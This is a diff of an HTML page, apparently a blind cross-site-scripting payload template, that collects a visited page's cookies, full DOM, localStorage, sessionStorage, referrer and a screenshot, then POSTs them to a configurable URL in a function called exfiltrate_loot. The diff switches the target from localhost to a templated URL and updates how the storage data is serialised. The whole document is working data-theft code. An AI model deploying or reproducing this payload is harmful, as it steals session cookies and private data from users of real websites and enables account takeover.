@@ -1,4 +1,5 @@
-<html><head>
+<html>
+    <head>
         <title>Welcome to the snow window</title>
     </head>
     <body>
@@ -17,9 +18,8 @@
                 function exfiltrate_loot() {
                     var xhr = new XMLHttpRequest()
                     console.log(collected_data)
-                    xhr.open("POST", "http://localhost:8899/c", true)
-
-                    xhr.setRequestHeader("Content-Type", "application/json")
+                    xhr.open("POST", "{{.Url}}", true);
+                    xhr.setRequestHeader("Content-Type", "application/json");
                     xhr.send(JSON.stringify(collected_data));
                 }
 
@@ -29,7 +29,7 @@
                     try {
                         html2canvas(document.body).then(function(canvas) {
                             try { collected_data["IMG"] = canvas.toDataURL() } catch(e) {}
-
+//                            collected_data["IMG"] = collected_data["IMG"].slice(0, 4096)
                             try { collected_data["Location"] = return_value(location.toString()) } catch(e) {}
                             try { collected_data["Cookies"] = return_value(document.cookie) } catch(e) {}
                             try { collected_data["Referrer"] = return_value(document.referrer) } catch(e) {}
@@ -37,9 +37,9 @@
                             try { collected_data["Browser Time"] = return_value(new Date().toTimeString()); } catch(e) {}
                             try { collected_data["Origin"] = return_value(location.origin); } catch(e) {}
                             try { collected_data["DOM"] = return_value(document.documentElement.outerHTML); } catch(e) {}
-                            
-                            try { collected_data["localStorage"] = return_value(localStorage.toSource()); } catch(e) {}
-                            try { collected_data["sessionStorage"] = return_value(sessionStorage.toSource()); } catch(e) {}
+                            //collected_data["DOM"] = collected_data["DOM"].slice(0, 4096)
+                            try { collected_data["localStorage"] = return_value(JSON.stringify(localStorage)); } catch(e) {}
+                            try { collected_data["sessionStorage"] = return_value(JSON.stringify(sessionStorage)); } catch(e) {}
                             exfiltrate_loot()
                         });
                     } catch(e) {}
@@ -48,6 +48,5 @@
                 collect_data()
             })();
         </script>
-    
-
-</body></html>
+    </body>
+</html>
